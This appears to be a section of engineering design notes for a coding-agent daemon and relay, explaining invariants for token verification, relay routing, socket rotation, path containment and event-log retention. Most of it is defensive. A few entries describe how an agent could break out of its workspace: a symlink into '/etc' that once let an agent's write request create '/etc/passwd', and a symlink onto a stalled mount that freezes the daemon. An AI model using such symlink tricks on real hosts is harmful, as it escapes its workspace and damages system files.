## Invariants — rules that were defects first

These are load-bearing. Each was a real defect before it was a rule, and none of
them is enforced by the compiler.

### Tokens and authentication

#### Q5.1 — Why is a token's payload never parsed before the signature verifies?

**Rule.** No claim is read before the signature verifies.
`SignedTokenVerifier.verify` looks up the key by `kid`, calls
`verifySignature`, and only then parses the payload. `decodeToken`
deliberately hands back the payload as an *unparsed string*.

**Why.** A function that returned `TokenClaims` before verification would make
trusting an unsigned claim a one-line mistake. Handing back a string makes
writing the other order awkward rather than natural.

**Status.** Current

#### Q5.2 — Why is `aud` checked against the enrolled `machineId`?

**Rule.** `aud` is checked against the enrolled `machineId`.

**Why.** Every daemon in a fleet trusts the same control-plane public key, so a
token minted for machine A verifies perfectly at machine B on signature alone.
Without the audience check, one grant is a grant to every machine. This is the
single most consequential line in `auth.ts`.

**Status.** Current

#### Q5.3 — Why is `alg` compared to the literal string `EdDSA` before anything else?

**Rule.** `alg` is compared to the exact string `EdDSA`, before anything else.
The key is then found by `kid` in a set already held, and used only for
Ed25519.

**Why.** That combination is what makes `alg: "none"` and
HMAC-with-the-public-key *structurally* impossible rather than defended against
case by case.

**Rejected.** Turning that comparison into a table lookup.

**Status.** Current

#### Q5.4 — Why must base64url decoding be strict rather than lenient?

**Rule.** base64url decoding is strict. `b64uDecode` re-encodes and compares, to
insist the input was already canonical.

**Why.** `Buffer.from(s, "base64url")` silently skips characters it does not
recognise, so `"ab!cd"` and `"abcd"` decode identically. Two distinct token
strings that verify against one signature turn a token into a *family* of
tokens and make `jti` meaningless as an identifier.

**Status.** Current

#### Q5.5 — Why is enrollment single-use enforced in one conditional `UPDATE`?

**Rule.** Enrollment single-use is one conditional `UPDATE`, then
`changes === 1`:
`WHERE code_hash = ? AND used_at IS NULL AND expires_at > ?` — checked and
acted on in one statement.

**Why.** Reading the row and then marking it used leaves a window in which two
daemons both pass the read, which is precisely what a single-use code must not
allow.

**Status.** Current

#### Q5.6 — Why does the daemon make exactly one control-plane request, ever?

**Rule.** The daemon makes exactly one control-plane *request*, ever: at
enrollment, in `enroll.ts`. Nothing refreshes a key, polls a revocation list, or
renews anything. Key rotation costs a re-enrollment instead, which is why the
key set is plural. The relay tunnel is a **connection, not a request** — no key
is fetched over it, no revocation list is polled, no token is validated by it;
it carries traffic in the other direction, inbound requests to this daemon.
What must never appear is code that *reads something it needs* from the control
plane, over the tunnel or otherwise.

**Why.** Every "just poll for X" turns every daemon in the fleet into something
that stops working when the control plane does — which is the one property this
whole design buys. If the tunnel never connects, everything above still holds;
that is not the same as saying the daemon is usable, since the tunnel is the
only way in, so a daemon with no tunnel is unreachable while remaining
perfectly correct.

**Status.** Current

### The relay

#### Q5.7 — Why does the relay derive a machine id from the credential instead of reading one off the request?

**Rule.** The relay derives a machine id from the credential; it is never a
request field. There is no header, query parameter or handshake field anywhere
in the tunnel protocol that names a machine. A daemon presents a secret and
`resolveTunnelKey` looks up whose it is.

**Why.** "A daemon cannot open a tunnel claiming a machine id that isn't its
own" is therefore a property of the lookup, not a comparison somebody has to
remember to write — and it cannot be reopened by someone adding a convenience
parameter later, because there is nothing to add it to.

**Status.** Current

#### Q5.8 — Why does the relay route by the verified `aud` claim rather than by the URL?

**Rule.** The relay routes by the verified `aud` claim, not by the URL. No
machine id appears in a relayed path.

**Why.** There is nothing for the token to disagree with: the only machine a
caller can address is the one their token was minted for. This is the same
audience binding `auth.ts` enforces, made structural rather than checked.

**Rejected.** Putting the machine in the path, which would reintroduce exactly
the mismatch that check exists to catch.

**Status.** Current

#### Q5.9 — Why does authorization complete before a stream is opened, never after?

**Rule.** In `proxy.ts`, `authorizer.authorize` runs to completion before
`tunnel.open`. A refused request must not increment `requestsProxied`.

**Why.** That counter is how "a client that could reach the daemon directly did
not touch the relay" is verified, and a counter that moved on refusals would
quietly stop measuring anything.

**Status.** Current

#### Q5.10 — Why does none of the relay's own metadata enter the proxied request?

**Rule.** `reemoat-*` headers ride the CONNECT handshake and stop at the
daemon's tunnel code; a client-supplied copy is stripped in `forwardHeaders`.

**Why.** Injecting them into the request would mean parsing and rewriting HTTP
inside the tunnel, which is what carrying opaque bytes exists to avoid, and
would hand the relay a way to alter a request it is only supposed to carry.

**Status.** Current

#### Q5.11 — Why does an upgrade socket get an `error` listener before anything else?

**Rule.** An `error` listener is attached as the first statement of
`handleUpgrade`, before `authorize`, because the refusal paths write to that
socket too. `main.ts` also carries an `uncaughtException` backstop that logs and
continues.

**Why.** Node removes its own `socketOnError` *before* emitting `upgrade`, so
the raw socket handed to `handleUpgrade` starts with zero listeners — and an
`'error'` event with none is an uncaught exception. The window is a full tunnel
round trip (authorize, open a CONNECT stream, wait for the daemon to dial
loopback and answer 101), and a phone leaving Wi-Fi mid-handshake sends RST,
which is exactly that event. The process going down is a worse outcome than
almost anything it could be going down for — it holds the API, the relay, the
web UI and every tunnel in the fleet.

**Measured.** `socket error listeners = 0` then `read ECONNRESET`, exiting the
process that holds the API, the relay, the web UI and every tunnel in the
fleet.

**Status.** Current

#### Q5.12 — Why does the relay log a path and never a URL?

**Rule.** The relay logs a path, never a URL. `pathOf` exists for this;
`auth.code`, `tokenId` and `subject` are what a log line is allowed to say.

**Why.** A browser cannot set headers on a WebSocket, so the credential arrives
as `?token=<JWS>` — and the tokens on the *refusal* paths are the worst ones to
leak, not the most harmless. `no_scopes`, `machine_not_found` and
`user_disabled` all refuse tokens that are cryptographically intact and
unexpired: the refusal is this service's policy, not a fact about the token,
which the daemon would still verify perfectly because it never asks this service
anything. So a leaked one is a working credential against any path that does not
run this check, and the log is the one place it can leak in full.

**Status.** Current

### The client and the socket

#### Q5.13 — Why must a make-before-break rotation never rewind the cursor?

**Rule.** The replacement socket captures its `since` when it is *opened*, and
the old socket stays live and keeps delivering through the handshake.
`Math.max` guards the assignment.

**Why.** Assigning `frame.since` unconditionally rewound the cursor and thereby
defeated the `seq <= lastAppliedSeq` skip that the whole overlap depends on:
everything the old socket delivered during the handshake was replayed out of the
successor's backlog and appended a second time, contiguously, so the hole check
could not see it either.

**Measured.** `pnpm webcheck` fails with `[…6,7,8,6,7,8,9,10]` without it.

**The same skip decides what `reattachSince` may answer, and the answer belongs in
the pure function.** Its "held ahead of the row" arm returned the row's
`snapshot.lastSeq`, which is below the held tail whenever the 4s-old poll lags what
`onEvents` has already appended — the ordinary state of a session that is talking.
`SessionStream`'s `lastAppliedSeq` starts at that number, so the `seq <=
lastAppliedSeq` skip the whole overlap depends on could not fire for the overlap at
all, and `store.onEvents` (a plain concat, no dedup) drew the agent's last sentence
twice under an existing React key — contiguous, so the hole check saw nothing. It
was first fixed with a `Math.max` at `openSession`, and that was the wrong place:
the exported function anybody can ask then answered a number the socket never sent,
and `webcheck` pinned that number — the `sessionOf` drift in the direction where
the assertable copy is the wrong one. Arm 2 returns `heldLast` now. Asking from the
held tail is safe in the other direction because the daemon clamps `since` forward
with `Math.min(sinceParam, stats.lastSeq)` and `hello`'s own `Math.max` absorbs it.

**Status.** Current

#### Q5.14 — Why is a stream never opened without the row that says where to attach?

**Rule.** The cursor is `snapshot.lastSeq`. `openSession` declines when there is
no row, and `attachWanted` — called wherever `rows` is filled — opens the stream
the moment the list lands. Both halves are needed: the view's effect is keyed on
ids that never change, so nothing else would ever call it again.

**Why.** The snapshot arrives on the session *list*, which lands after the
machines do — `bootstrap()` flips to `ready` as soon as it has connections,
`SessionView` mounts on that, and its effect fired while the list was still in
flight. Falling back to `0` is not a smaller attach, it is the largest one there
is: `since=0` asks the daemon to replay the whole log, which
`StreamConnection.attach` queues in one synchronous block against a bound sized
for exactly that not to happen. Declining costs nothing, since with no row
`SessionView` is already drawing "not on this daemon" from the same map.

**Measured.** 2026-08-01 against a stub daemon: a hard reload onto a session URL
opened `since=0`, the same session reached by tapping it opened `since=3`.

**Status.** Current

#### Q5.15 — Why does the SPA fallback re-read `index.html` from disk per request?

**Rule.** The SPA fallback serves the same `index.html` that `/` does, from
disk, per request. One mechanism for both, so they cannot drift apart again.

**Why.** It used to hold a `readFileSync` copy taken at registration, reasoning
that a bundle is immutable per build and a rebuild restarts the process. The
second half is false: `pnpm web:build` rewrites `dist/` under a running control
plane and nothing restarts it. So `/` went through `serveStatic` and streamed
the new HTML naming the new hashed chunks, while every *client-side* route fell
through to the cached copy naming chunks Vite had already deleted. Restarting
"fixed" it, which is what made it a trap rather than a bug anybody would find.
It also costs no synchronous I/O in a handler, which was the real point of the
cache, since this process carries every relay tunnel.

**Measured.** 2026-08-01 against a running instance: `/` served
`index-BnlrEjly.js`, `/m/:machine/s/:session` served `index-0vnvikLW.js`, and
that file answered 404 — so the home screen worked and reloading on a session
gave a blank white page with an empty `<div id="root">`, no error and nothing to
read, on a phone with no console.

**Status.** Current

#### Q5.16 — Why is not every non-2xx response an error envelope?

**Rule.** The daemon answers a repeated permission answer with `409` carrying a
*success*-shaped body — `{recorded: true, repeat: true, outcome, session}`, no
`error` key. `ApiError` therefore keeps the parsed `body`, which
`scripts/client.ts` always did.

**Why.** The answer really did land and the caller should treat it as success. A
client that reads only `error.code`/`error.detail` turns that into `http_409`
with a null detail and reports a successful approval as a failure, showing the
raw JSON as the message.

**Status.** Current

#### Q5.17 — Why is the 409-carrying-a-success-body shape now pinned at both ends?

**Rule.** `daemoncheck` answers the same permission twice against a live agent
and asserts the 409 carries `recorded: true`, `repeat: true`, the outcome of the
answer that **won** rather than the one just sent, and no `error` key at all.

**Why.** `webcheck` has always asserted the client copes with the shape; nothing
asserted the daemon still *sends* it, so the two could drift and a successful
approval would begin rendering as a failure.

**Status.** Current

#### Q5.18 — Why does a route retry replay only an idempotent request?

**Rule.** `isReplayable` gates the retry to `GET` and `DELETE`. The belief that
the machine is up is still dropped either way; only the replay is gated.

**Why.** A transport failure says nothing about whether the daemon *acted*: the
timeout that usually triggers it is the client's own, fired long after the
daemon accepted the request, appended the event and started the turn. Replaying
`POST /sessions` creates a second session with a second worktree and a second
agent for one tap. This invariant was deleted along with the route memo it was
written for while the code it describes was not — a rule still enforced in
`machine.ts` but written down nowhere is one somebody removes as dead, which is
the `owned` → `sessionOf` rename's failure mode in the other direction.

**Status.** Current

#### Q5.19 — Why is a relay `503 no_tunnel` the only answered request that means the machine is gone?

**Rule.** `meansMachineGone` in `http.ts` is the single place that code is
recognised, and `request` drops the route and marks the machine unreachable on
it. It keys on the **code and never the status**.

**Why.** There is no direct path to probe, so this code is how a client learns a
daemon is not there. The daemon answers its own `503 unresponsive` when a browse
path sits on a stalled network mount, and that is a reachable machine saying one
directory did not answer — reading the status would take a healthy machine
offline for it. `pnpm webcheck` drives both.

**Status.** Current

#### Q5.92 — What happens to a rotation whose primary dies mid-handshake?

**Rule.** `connect()` runs `closeQuietly(this.successor); this.successor = null;`
immediately **before** `++this.generation`.

**Why.** `successor` is cleared in exactly three places — `teardown()`, the `hello`
that promotes it, and its own `onclose` — and the last two are behind `if
(generation !== this.generation)`. So a primary dying mid-rotation went `onclose` →
`handleClose` → `retryLater` → `connect()`, the bump silenced the orphan's `onclose`
for ever, and the field stayed non-null for the life of the stream: every later
`rotate()` returned at its first line. The make-before-break this class exists for
stopped happening, and the session flapped through a daemon-sent `4401` every five
minutes instead — while the orphaned socket stayed attached, holding a
`StreamConnection` on the daemon. The window is ordinary: a phone handing over
Wi-Fi→LTE sends RST, and the successor's open is a full relay round trip.

**Why it cannot cancel a healthy rotation.** `connect()` is only ever reached with a
dead or absent primary — `start()` declines while `socket !== null`, and
`reconnect()` has already run `teardown()`.

**Consequence.** A successor whose `hello` was about to land is closed and re-opened
by the new connect: one wasted round trip, in a case that was previously broken
outright. `rotate()`'s early return still does not reschedule, deliberately — every
path that leaves it early is re-armed by the `hello` after the reconnect.

**Status.** Current

### Tunnels, reconnection and revocation

#### Q5.20 — Why is reconnect backoff reset by a connection that survived rather than one that opened?

**Rule.** Backoff resets only after a tunnel has been up long enough to count as
stable, never in the `open` handler.

**Why.** Resetting on open means a tunnel that dies immediately never backs off
at all — `attempt` returns to 0 and the delay is drawn from [0, 1s) for ever.
Two daemons holding the same tunnel key (a restored database, a cloned image)
then supersede each other about twice a second indefinitely, and the relay
cannot tell them apart because the machine id is derived from the credential by
design.

**Status.** Current

#### Q5.21 — Why is a tunnel with no daemon a 503 rather than a queue?

**Rule.** `sendNoTunnel` answers immediately.

**Why.** Holding requests until a daemon reappears turns a relay outage into a
relay memory leak during precisely the incident it should be surviving.

**Status.** Current

#### Q5.22 — Why does the newest tunnel win, and why is unregister identity-checked?

**Rule.** Newest tunnel wins, and `TunnelRegistry.unregister` deletes only if
the tunnel is still the registered one.

**Why.** After a partition a daemon reconnects while the relay still holds a
socket it cannot know is dead, so refusing the new one would strand the machine
until a TCP timeout that may never come. Unconditional deletion would
unregister the healthy *replacement* when the superseded tunnel's close event
fires afterwards, leaving a machine offline with a live socket nobody can find.

**Status.** Current

#### Q5.23 — Why does a restart with the same enrollment code make no network call?

**Rule.** The daemon stores a fingerprint of the code it redeemed and compares.

**Why.** This is not an optimization: codes are single-use, so a daemon that
re-exchanged on every boot would fail to start the second time.

**Status.** Current

#### Q5.24 — Why is a socket's lifetime bounded by its token, with the client rotating first?

**Rule.** The daemon closes `4401` when `now > exp + leeway`; the relay
authorizes at CONNECT and never tears a live stream down; the browser opens a
replacement at `exp − 60s`, waits for its `hello`, then closes the old one. The
replacement attaches at `since = lastAppliedSeq`, `read` is `WHERE seq > ?`, and
the client skips `seq <= lastAppliedSeq`, so the overlap during a rotation is
free rather than tolerated.

**Why.** Three parties, one rule, and it holds because nobody added a second
timer.

**Rejected.** Re-authenticating over the socket. The WS is read-only, and
`ws.send()` into a half-open socket succeeds silently, so a refresh that
evaporated would leave a client believing it is connected right up until the
close.

**Status.** Current

#### Q5.25 — Why is CORS `*`?

**Rule.** CORS is `*` because there are no cookies. The credential is always an
explicit header or an explicit `?token=`, never ambient.
`Access-Control-Allow-Credentials` is never sent. The relay answers preflights
*itself*, before `authorize`, and that answer must never touch
`requestsProxied`; `pnpm relaycheck` asserts it.

**Why.** A wildcard grants a hostile page exactly what it already had with
`curl`; the wildcard-plus-credentials pair is the combination that would
actually be dangerous. A preflight carries no token and therefore no `aud` —
there is no machine to route it to.

**Status.** Current

#### Q5.26 — Why does the WS re-check expiry on the ping tick?

**Rule.** `StreamConnection`'s heartbeat re-checks token expiry. `expiresAt` is
`null` under the shared secret, so that path is untouched.

**Why.** A stream is authenticated once, at the upgrade, and then lives as long
as the client holds it open. Without the check, a 5-minute token buys an
unbounded-lifetime connection and revocation never reaches an attached client at
all.

**Status.** Current

### Session identity, paths and the filesystem

#### Q5.27 — Why is an unknown session id a 404, and why is the helper called `sessionOf`?

**Rule.** An unknown session id is a 404, and the helper that resolves one is
called `sessionOf` rather than `owned`.

**Why.** It used to be half of a stronger rule: every per-session route resolved
through `registry.getFor`, and "no such id" and "not yours" were the same 404
because a 403 would confirm the session exists. There is no "not yours" any
more. The rename is the invariant: a helper whose name asserts a property nobody
enforces is how the property gets "restored" by somebody who believes it is
still there.

**Status.** Current

#### Q5.28 — Why do only `title` and `pinned` appear in the session upsert's `DO UPDATE`?

**Rule.** `title` and `pinned` (v5) are the only columns on `sessions` in the
upsert's `DO UPDATE` clause.

**Why.** `agent` and `created_at` stay out of it because they are immutable
identity, and an upsert that can rewrite them can corrupt a row it was only
meant to touch.

**Status.** Current

#### Q5.29 — Why is there no synchronous filesystem call on a path the daemon did not create?

**Rule.** No synchronous filesystem call on a path this daemon did not create.
`stall.ts` owns the mechanism and `probeExists` is the shared answer. What is
left synchronous is either a path the daemon made (`worktree add`'s own target
under `worktreeRoot`) or sits behind one of those probes (`changes.ts`'s
per-file `lstat`, `containedIn` in the remover) — the honest boundary rather
than a claim that none remain.

**Why.** A hard network mount whose server has paused blocks inside the kernel
and cannot be interrupted: synchronously it stops the event loop — every
session, every socket and `/health` with it — and asynchronously it costs a
libuv threadpool slot for the life of the process. `browse.ts` was rewritten for
this and the rule was then read as being about browsing, which is why
`server.ts` kept `existsSync(managed.workspace.root)` in front of
`GET /sessions/:id/changes`: for a `plain` session that root **is** the `cwd`
the caller named, so it was the same death by a different route, reachable with
`session:read`.

**Status.** Current

#### Q5.30 — Why does a path probe have three answers rather than two?

**Rule.** `probeExists` returns `true | false | null`, and
`WorkspaceStatus.exists` carries the same shape. `inspectWorkspace` takes the
"could not tell" path on `null`, and `removeWorkspace` **refuses to `rm` on
`null`**.

**Why.** `existsSync` could only say gone-or-there, so a workspace on a sleeping
NAS was reported deleted — `409 workspace_missing` about work that is almost
certainly fine. It is now `503 workspace_unresponsive`. The one `rmSync` in this
codebase must never run against a path that could not even be stat'ed. Same
reasoning as `Liveness` and an agent's `loggedIn`, for the third time and for
the same reason.

**Status.** Current

#### Q5.31 — Why is the lenient containment helper never used for a trust decision?

**Rule.** `atOrUnder` falls back to comparing the path *as written* when
`realpath` throws — which it does whenever the final component is missing, i.e.
for every file about to be created. It is correct only where the path is *ours*
and merely not created yet, such as a worktree about to be made, and nothing
else may use it to decide about a path somebody else chose.

**Why.** With `~/link -> /etc` inside its own tree, an agent asking to write
`/home/link/passwd` got a permitted path back and `session.ts` created
`/etc/passwd`.

**Measured.** That measurement is kept even though its consumer is gone:
`atOrUnderReal` had exactly one caller, the path map, and went with it.

**Status.** Current

#### Q5.32 — Why is there exactly one containment primitive file?

**Rule.** There is exactly one containment primitive file, and `browse.ts` no
longer carries a third copy.

**Why.** Its private textual version disagreed with both others and
fail-closed, so `/fs/list` answered `403` for the caller's own home on any host
whose root traverses a symlink, while `POST /sessions` accepted the same path.

**Status.** Current

#### Q5.33 — Why does a liveness probe have three answers, not two?

**Rule.** `Liveness` is `"alive" | "dead" | "unknown"`, and anything that is not
`"dead"` is still worth signalling.

**Why.** `alive()` returned a boolean, so "I watched it die" and "I could not
ask" were the same value, and `doStop` wrote `agentConfirmedDead: true` for an
agent that was still running — which also makes the row terminal, so the next
boot's reaper skips it. The third answer survives the container that motivated
it, on host grounds: `process.kill(pid, 0)` throws `EPERM` as readily as
`ESRCH`, and they mean opposite things. `ESRCH` is "gone"; `EPERM` is "there,
and not yours to signal".

**Status.** Current

#### Q5.34 — Why was the third liveness answer unreachable even after the type existed?

**Rule.** `isAlive` must not collapse every error to "dead". A deliberate
two-answer probe exists only in `src/store/sqlite.ts`, for the daemon lock, and
says at the call site why the same errno means the opposite there.

**Why.** `isAlive` returned a boolean, caught every error and answered "dead" —
the collapse the type exists to forbid, one layer below the type. Reachable
rather than theoretical: the reaper signals a pid a *previous* daemon recorded,
and after a crash and enough churn that number can belong to somebody else,
which is exactly `EPERM`. For the daemon lock the row was written by a daemon
under the same `HOME`, so a pid that cannot be signalled is one that has been
recycled away from it, i.e. the lock is free.

**Status.** Current

#### Q5.35 — Why is the daemon lock claimed before the schema is touched?

**Rule.** `claimDaemonLock` touches only the `daemon` table, which `schema.sql`
creates with `IF NOT EXISTS`, and runs immediately after the schema load and
before anything else.

**Why.** `migrate()` adds columns and `checkSchemaVersion` stamps
`user_version`, both permanent; running them first meant a second daemon that
was about to be *refused* had already upgraded the file under the one still
running, which then cannot restart and has no down migration.

**Status.** Current

#### Q5.36 — Why is worktree creation containment-checked and not only removal?

**Rule.** Nothing outside the managed worktree root is ever removed, checked
before the add and again after it, and the `repoKey` component is `lstat`ed so a
link is refused rather than followed. The check has to agree with
`createWorkspace` about which root that is.

**Why.** `removeWorkspace` asserted containment before it would `rm`; creation
asserted nothing, and `repoKey` is derivable from a gitfile — replacing that one
directory with a symlink redirected the next session's checkout. Reframed as
**self-protection** now that there is nobody to defend against: what it guards
is the one `rmSync` in the codebase. When the two roots disagreed it refused
every time, silently, while the route still reported success.

**And the two sides have to be in the same namespace.** The pre-add check compared a
leaf that cannot exist yet — so `containedIn` falls back to comparing the path *as
written* — against a root that resolves fully. Wherever the worktree root traverses a
symlink (`/tmp` on macOS, `~/.reemoat` moved onto another disk) the two sides are in
different namespaces, the prefix test fails, and **every** `POST /sessions` threw
`outside_worktree_root` naming the daemon's own root as outside itself. It now
resolves the deepest component that exists — `repoDir` if present, else the root —
and rebuilds the not-yet-created leaves onto that answer. Invisible on an ordinary
Linux host, which is why it survived. `daemoncheck` drives creation under a symlinked
root against a real repo, with the guard that must **not** have been relaxed as the
control: a per-repository directory replaced with a symlink is still refused by
`lstat`.

**Status.** Current

#### Q5.93 — Where does containment stop being syntax and start touching the disk?

**Rule.** Two halves. `safeRelPath` is purely syntactic and touches no filesystem at
all; `probeContained` is the async half, resolving root and *parent* through
`stall.ts`'s `probeRealpath` and answering `true | false | null`.
`requestedPath` in `server.ts` awaits it and answers `503 path_unresponsive` on
`null`, `400 invalid_path {escapes_tree}` on `false`.

**Why.** The tail of `safeRelPath` was two `realpathSync` calls on
`<workspace.root>/<whatever the caller typed>` — which is exactly the event-loop
death Q5.32 documents, reached by a route nobody had counted. For a `plain` session
`workspace.root` **is** the `cwd` the caller named, and `workspaceReady` cannot save
it: that probes the *root*, which answers instantly, while the stall is on a mount
underneath. `GET /sessions/:id/files?path=…` on a hard NFS mount whose server had
paused took every session, every socket and `/health` with it at 0% CPU. An agent
reaches the same call with one `ln -s /mnt/nas nas` inside its own worktree.

**Two answers that are not refusals**, both preserving what the synchronous version
did: the **parent** is resolved and never the leaf, because a symlink whose target is
outside the tree is a legitimate changed file and git tracks the link rather than
what it points at; and a path that does not resolve at all is `true`, because "not
there" is not a traversal and the caller has a better code for it.

**`GET /worktrees` went the same way and is the starker case:** every path it resolves
is by construction one this daemon did not make — excluding those is the *purpose* of
the call — and it resolved both sides per iteration. An entry that does not answer is
now dropped from the listing.

**Consequence.** Two extra bounded `realpath` calls per request on those routes, so a
genuinely stalled mount costs one deadline each before a 503 where it used to answer
instantly. `stall.ts` remembers per mount point, so a workspace containing a dead
server costs one deadline rather than one per request.

**Measured.** `daemoncheck`: a real symlink out of the workspace is still refused by
the route as `400 invalid_path {escapes_tree}` — the half-revert catcher, since a
`requestedPath` that forgot to await would serve a file outside the tree — while
`safeRelPath` now *accepts* the same input, which is the direct-revert catcher, and
still refuses all six string rules. `probeContained` is driven for all three answers,
including `null` from a deadline that has already passed. The route's own `503
path_unresponsive` is **not** asserted and the reason is written at the check:
reaching it needs a root that answers while a path underneath it stalls, and the only
offline lever clears itself during `workspaceReady`'s own `stat`, one event-loop turn
earlier.

**Status.** Current

### The agent process, its capabilities and subagent lineage

#### Q5.37 — Why is the ACP `fs` capability granted?

**Rule.** `session.ts` implements `fs/read_text_file` and `fs/write_text_file`
by calling `readFile`/`writeFile` **in the daemon's own process**, on a path the
agent chose, and the capability is granted.

**Why.** That was a write primitive running outside the sandbox, so a sandboxing
runtime had to decline. There is no sandbox: the agent could make the same call
itself, so refusing would confine nothing and only lose the
`source: "fs_write"` half of the duplicated `file_change` pair.

**Status.** Current

#### Q5.38 — Why is the gate that could decline `fs` kept even though nothing declines it?

**Rule.** `AcpClient` answers `methodNotFound` when the runtime declines — the
same thing an unimplemented method returns — and `LaunchOptions.fileIo` is
**required**, so deleting the argument at either call site is a type error
rather than a silent grant.

**Why.** Declaring a capability is a *statement to a party we do not trust*, and
a statement is not a gate: the two handlers used to be registered
unconditionally, so an agent could send the request regardless of what was
advertised and `session.ts` would run it. That is the seam a confining runtime
would use, and re-declining is cheap.

**Measured.** 2026-07-30: kimi made five reverse-RPC calls with `fs` enabled and
none with it disabled; claude never used it either way. `pnpm daemoncheck`
drives a real `AcpClient` over in-memory pipes and sends the forbidden request.

**Rejected.** The old assertion, which compared a `readonly` constant to its own
literal and stayed green with the gate removed.

**Status.** Current

#### Q5.39 — Why is an agent handle still a union when only one arm is produced?

**Rule.** An agent handle is a union whose second arm is read-only legacy. Only
the local arm is produced now; it is kept as a union rather than flattened to
`number` because `toHandle` still has to answer **no handle at all**, which is a
different fact from "pid 0".

**Why.** It had two arms while agents ran in containers: a host pid and a
process group inside one are different number spaces with different fences, and
stored in a single column they would be indistinguishable — with the cost of
confusing them being SIGKILL to whatever now holds that number. Rows written by
the multi-tenant daemon can still carry a container arm on disk; the reaper
reports such a handle as one it will not signal, which is the honest answer
rather than a guess at a number in somebody else's namespace.

**Status.** Current

#### Q5.40 — Why does the daemon carry only the parent link and never reorder to prove lineage?

**Rule.** A subagent is a tool call that started other tool calls, and the
daemon never reorders to prove it. The parent link is carried and nothing else
is: no depth, no synthesised parent, no buffering of a child until its parent is
seen, no validation against ids already seen. Arrival order stays seq order
stays delivery order.

**Why.** Each of those is a real temptation and each breaks something. Depth is
derived from the chain, and a stored copy disagrees with it the moment the
parent is evicted — the log evicts a *prefix*, so that is the common case. A
hold is an unbounded wait on the emit path. A "seen ids" set both grows without
bound and *drops a true edge* exactly when the parent has aged out.

**Status.** Current

#### Q5.41 — What three lineage rules must every reader of the event stream obey?

**Rule.** Written into `wire.ts` because nothing enforces them: a parent may be
absent and that is **normal**; a child may arrive first; and **every traversal
must be cycle-safe**.

**Why.** The daemon normalizes only self-reference, so two mutually-parented
calls are something a client will be sent.

**Status.** Current

#### Q5.42 — Why is `MAX_DEPTH` not the cycle bound?

**Rule.** A visited set per walk is the actual requirement, and a repeated
`toolCallId` is refused for the same reason.

**Why.** The third rule used to read "depth must be bounded by the client
(`MAX_DEPTH`)". `MAX_DEPTH` says when a walk stops *climbing* and says nothing
about how many hops it may take. Rebinding an id mid-pass is what let two live
entries point at each other.

**Measured.** `placeNodes` held `MAX_DEPTH` and still ran forever on a
two-element cycle — in both of its walks, on two `tool_call` events — inside
`EventList`'s `useMemo`, so an unrecoverable tab that came back on every reload
because the events are on disk. `pnpm webcheck` drives both shapes, and a
regression there does not print `FAIL` — it hangs the driver.

**Status.** Current

#### Q5.43 — Why is the parent id bounded at ingest rather than at the store?

**Rule.** The parent id is bounded at ingest — `MAX_PARENT_ID_CHARS`, 256, in
`acp/subagents.ts`.

**Why.** `truncateEvent` spreads the field through untouched on both arms by
design, so without a ceiling an agent-chosen string walks an event past the
per-event cap with nothing willing to shrink it.

**Status.** Current

#### Q5.44 — Why is the client's nesting layout decided by whether a call has children?

**Rule.** The client's **layout** is decided by whether a call has children —
never `kind === "think"`, never a title match.

**Why.** That is what makes kimi's degradation structural: its adapter filters
subagent events at the source, so no call ever has a child and every card is the
card it was. `pnpm webcheck` asserts the node tree on that path is unchanged —
keys and childlessness, which is what a driver with no DOM can honestly claim.

**Status.** Current

#### Q5.45 — What does the agent's own `subagent` flag decide, and where is it read from?

**Rule.** The flag decides whether the card is *drawn* as a delegation: the icon
takes `subagent || steps > 0` while nesting, the step badge and the running
headline still take children alone, and the badge is gated on `steps` so a
childless spawn does not claim "0 steps". The flag is read from the `tool_call`,
never merged from an update; `session.ts` copies only the parent edge onto an
update.

**Why.** claude drops `subagent: true` on the spawn's own completing update, so
an update silent about the flag must not be mistaken for one denying it. Reading
it only from the spawn is what avoids the flicker the old rule avoided by
ignoring the flag entirely.

**Measured.** 2026-08-01: three delegations of one trivial task rendered as two
robots and a brain. The odd one out was a delegate that answered from the model
alone, so it made no tool call to attribute, had no children ever, and fell
through to the kind icon — and claude's spawn is `kind: "think"`. "No step ever
arrives" is a case, not a transient.

**Status.** Current

### The event log

#### Q5.46 — Why is a session's log never truncated?

**Rule.** `DEFAULT_MAX_EVENTS` and `DEFAULT_MAX_BYTES` are `Infinity`. A
conversation keeps every event it ever produced, for as long as the session
exists.

**Why.** It was 5000 events / 8 MiB, evicting a **prefix**. A conversation
somebody was still working in had lost its beginning, mid-word, permanently —
and the client could not distinguish that from a conversation that started
there, so the first thing a reader concludes is that the *client* failed to load
it.

**Measured.** Session `s_a7b154a7` on the development machine reached
`dropped: 6144`, so its oldest surviving event was an agent `text` chunk
containing the two characters `" for"`.

**Status.** Current

#### Q5.47 — Why is the invariant "no truncation" rather than "a bigger window"?

**Rule.** There is no number that makes prefix eviction acceptable. `Infinity`
is the default rather than deleting the machinery: `REEMOAT_LOG_EVENTS` and
`REEMOAT_LOG_BYTES` still bound it for an operator who wants that, and
`daemoncheck` drives eviction with `maxEventsPerSession: 8`, so the path stays
exercised instead of becoming code nobody runs.

**Why.** The failure is not proportional to the bound: losing the first half of
a conversation is not half a loss, because the part that says what the work *is*
— the prompt, the plan, the constraints somebody typed once — is at the top, and
the top is what a prefix eviction takes first. A transcript you cannot trust to
be whole is one you keep a copy of somewhere else, which is this product gone.

**Status.** Current

#### Q5.48 — What did removing the log window cost, and where is the bound now?

**Rule.** The *attach* is bounded where the *history* used to be:
`ATTACH_REPLAY_MAX` replays the newest 2000 and sends
`lagged{reason: "backlog"}` naming the range it skipped. That is the one lagged
reason which is **not** a loss, and a client must never draw it as a hole — the
events are on disk, `GET /sessions/:id/events` serves them, and `store.ts` pages
them in.

**Why.** The window was not arbitrary; it was holding up the WS queue.
`StreamConnection.attach` drains its whole backlog into an 8000-item queue in
one synchronous block, and past that it collapses and reports
`lagged{slow_consumer}` — a lie about a client that was never given the chance
to be slow. Bounding the socket rather than the record is the right way round: a
socket is a live channel and a transcript is a record, and only the socket ever
had a reason not to carry an arbitrary amount at once.

**2000 was only ever under the *event* half of the queue, and the lie came back
through the byte half.** `enqueue` also collapses on `MAX_QUEUE_BYTES` (16 MiB),
and at the 128 KiB per-event ceiling a full replay is 250 MiB — so a large attach
collapsed on bytes and reported `slow_consumer` after all, with the whole drain
still synchronous and the first `send` callback not yet run. `gapPlan` files that
as a permanent "events lost" marker over a conversation the daemon holds intact.
`emit`/`enqueue` now take a `replaying` flag and `collapse` takes the reason as an
argument: a replay overflow is `backlog`, which the client already answers by
refetching from `GET /sessions/:id/events`, and it is not recorded in the window
that closes the socket `4003`.

**Rejected.** A byte-bounded replay floor — reading fewer events so the drain
cannot exceed the queue. It needs the events read twice to size them, and the
defect was never the collapse: it was the *frame*.

